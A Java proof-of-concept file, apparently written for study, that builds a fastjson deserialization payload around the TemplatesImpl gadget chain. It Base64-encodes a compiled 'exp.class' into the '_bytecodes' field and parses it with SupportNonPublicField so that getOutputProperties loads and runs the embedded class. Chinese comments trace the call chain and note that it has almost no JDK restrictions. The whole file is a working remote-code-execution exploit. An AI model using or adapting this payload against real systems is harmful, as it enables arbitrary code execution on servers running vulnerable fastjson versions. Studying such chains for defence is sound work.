import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;


import java.io.File;
import java.io.FileInputStream;
import org.apache.commons.codec.binary.Base64;


/*
* 利用这条链详细看看fastjson的反序列化逻辑
* JavaBeanDeserializer.parseField方法会去除掉属性值前面的_或者-
*   DefaultFieldDeserializer.parseField
*       FieldDeserializer.setValue
*           TemplatesImpl.getOutputProperties
*
*
*
*
*
* 注意点：由于部分需要我们更改的私有变量没有 setter 方法，需要使用 Feature.SupportNonPublicField 参数。
*   基本没有什么jdk限制
* */
public class FastJson_TemplatesImpl {
    public static void main(String[] args) throws Exception{

        File file = new File("exp.class");
        FileInputStream fis = new FileInputStream(file);
        byte[] fileContent = new byte[(int) file.length()];
        fis.read(fileContent);

        // 使用Apache Commons Codec的Base64编码器将字节数组转换为Base64字符串
        String Base64Code = Base64.encodeBase64String(fileContent);
        String payload =
                "{" +
                    "\"@type\": \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"," +
                    "\"_bytecodes\": [\""+Base64Code+"\"]," +
                    "\"_name\": \"dragonkeep\"," +
                    "\"_tfactory\": {}," +
                    "\"_outputProperties\": {}," +
                "}";
        ParserConfig config = new ParserConfig();
        Object obj = JSON.parseObject(payload,Object.class,config,Feature.SupportNonPublicField);
    }
}
